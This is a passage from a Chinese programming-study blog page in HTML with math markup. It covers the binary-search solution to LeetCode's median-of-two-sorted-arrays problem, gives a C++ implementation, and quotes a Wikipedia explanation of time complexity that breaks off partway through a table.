class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span> 且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i-1] \leq \text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">j = \frac{m + n + 1}{2} - i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></p></blockquote><p>我们证明它等价于：</p><blockquote><p>在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span> 中找到最大的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>，使得：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mspace width="2em"/><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\qquad \text{A}[i-1] \leq \text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>−</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">j = \frac{m + n + 1}{2} - i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></p></blockquote><p>这是因为：</p><ul><li><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">0 \sim m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 递增时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> 递增，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 递减，所以一定存在一个最大的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i-1] \leq \text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>；</p></li><li><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 是最大的，那么说明 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 不满足。将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 带入可以得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>&gt;</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i] &gt; \text{B}[j-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，也就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>&lt;</mo><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{B}[j - 1] &lt; \text{A}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>，就和我们进行等价变换前 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 的性质一致了（甚至还要更强）。</p></li><li><p>因此我们可以对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span> 的区间上进行二分搜索，找到最大的满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i-1] \leq \text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span> 的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 值，就得到了划分的方法。此时，划分前一部分元素中的最大值，以及划分后一部分元素中的最小值，才可能作为就是这两个数组的中位数。</p></li></ul><p>作者：LeetCode-Solution</p></blockquote><p>再次用 C++ 练习了一下这个方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>() &gt; nums2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findMedianSortedArrays</span>(nums2, nums1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> a = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> b = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = a;</span><br><span class="line">        <span class="keyword">int</span> medmax = <span class="number">0</span>, medmin = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> j = (a + b + <span class="number">1</span>) / <span class="number">2</span> - i;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> med_in1 = i == <span class="number">0</span> ? INT_MIN : nums1[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">int</span> med_in2 = j == <span class="number">0</span> ? INT_MIN : nums2[j<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">int</span> med_ax1 = i == a ? INT_MAX : nums1[i];</span><br><span class="line">            <span class="keyword">int</span> med_ax2 = j == b ? INT_MAX : nums2[j];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(med_in1 &lt;= med_ax2) &#123;</span><br><span class="line">                medmax = <span class="built_in">max</span>(med_in1, med_in2);</span><br><span class="line">                medmin = <span class="built_in">min</span>(med_ax1, med_ax2);</span><br><span class="line">                left = i + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = i - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (a + b) % <span class="number">2</span> == <span class="number">0</span> ? (medmax + medmin) / <span class="number">2.0</span> : medmax;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>28 ms</strong></p></li><li><p>内存消耗: <strong>86.7 MB</strong></p></li></ul><blockquote><p>代码不算很复杂，但推理的过程确实非常巧妙。</p></blockquote><p>今天还是只搞这一道题，一直对时间/空间复杂度的概念不是很清楚，这里记录一下来自维基百科的解释：</p><h2 id="算法效率">算法效率</h2><h3 id="时间复杂度"><a href="https://zh.wikipedia.org/wiki/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6">时间复杂度</a></h3><p>在计算机科学中，算法的<strong>时间复杂度</strong>（Time complexity）是一个函数，它定性描述该算法的运行时间。这是一个代表算法输入值的字符串的长度的函数。时间复杂度常用大O符号表述，不包括这个函数的低阶项和首项系数。使用这种方式时，时间复杂度可被称为是渐近的，亦即考察输入值大小趋近无穷时的情况。例如，如果一个算法对于任何大小为 n （必须比 n0 大）的输入，它至多需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><msup><mi>n</mi><mn>3</mn></msup><mo>+</mo><mn>3</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">5n^3 + 3n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mord mathnormal">n</span></span></span></span>的时间运行完毕，那么它的渐近时间复杂度是 O(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>)。</p><p>为了计算时间复杂度，我们通常会估计算法的操作单元数量，每个单元执行的时间都是相同的。因此，总运行时间和算法的操作单元数量最多相差一个常量系数。</p><p>相同大小的不同输入值仍可能造成算法的执行时间不同，因此我们通常使用算法的最坏情况复杂度，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，定义为任何大小的输入 n 所需的最大执行时间。另一种较少使用的方法是平均情况复杂度，通常有特别指定才会使用。时间复杂度可以用函数 <em>T</em>(<em>n</em>) 的自然特性加以分类，举例来说，有着 T(n) = O(n) 的算法被称作“线性时间算法”；而 T(n) = <em>O</em>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">M^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>) 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">M^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>= O(T(n)) ，其中 M ≥ n &gt; 1 的算法被称作“指数时间算法”。</p><p>以下表格统整了一些常用的时间复杂度类。表中，poly(x) = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">x^{O(1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>，也就是 x 的多项式。</p><table><thead><tr><th>名称</th><th style="text-align:center">复杂度类</th><th style="text-align:center">运行时间（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>)</th><th style="text-align:center">运行时间举例</th><th style="text-align:center">算法举例</th></tr></thead><tbody><tr><td>常数时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center">10</td><td style="text-align:center">判断一个二进制数的奇偶</td></tr><tr><td>反阿克曼时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\alpha(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"></td><td style="text-align:center">并查集的单个操作的平摊时间</td></tr><tr><td>迭代对数时间</td><td 